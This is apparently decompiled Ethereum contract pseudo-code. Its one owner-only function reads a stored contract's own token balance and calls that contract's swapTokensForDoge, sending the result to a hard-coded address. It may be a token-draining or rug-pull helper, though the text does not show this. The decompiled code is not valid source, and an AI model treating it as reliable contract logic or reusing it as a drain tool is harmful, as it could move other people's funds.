contract main {




// =====================  Runtime code  =====================


address stor3;

function _fallback() payable {
    revert
}

function sub_5d198d9b(?) payable {
    if 0x58224de3013e402e3488f3f9837f77746d8f94c2 != msg.sender:
        revert with 0, 'fuck u'
    staticcall stor3.0x70a08231 with:
            gas gas_remaining wei
           args stor3
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] > 0
    require ext_code.size(stor3)
    call stor3.swapTokensForDoge(uint256 arg1, address arg2) with:
         gas gas_remaining wei
        args ext_call.return_data[0], 0x774e0d8b93215d4d330f72093402bf99d12cd04f
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
